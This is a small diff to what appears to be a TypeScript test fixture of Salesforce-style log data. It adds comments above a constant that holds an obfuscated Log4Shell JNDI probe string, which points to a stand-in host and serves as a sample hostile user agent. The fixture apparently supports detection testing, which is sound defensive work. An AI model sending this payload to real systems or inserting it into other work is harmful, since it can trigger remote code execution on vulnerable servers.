@@ -21,6 +21,8 @@ export const D2 = '2026-09-15';
 export const LINKED_USER = '005xx000000tstU';
 export const BASELINE_DAYS = ['2026-06-29', '2026-07-01', '2026-09-14', '2026-09-16'];
 const DAYS = ['2026-06-29', D1, '2026-07-01', '2026-09-14', D2, '2026-09-16'];
+// A Log4Shell probe string, deliberately not a template literal.
+// oxlint-disable-next-line no-template-curly-in-string
 const LOG4SHELL_UA = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.example.com/a}';
 
 const AURA_HEADER = ['TIMESTAMP_DERIVED', 'USER_ID', 'CLIENT_IP', 'USER_AGENT', 'URI', 'REQUEST_ID', 'ACTION_MESSAGE'];
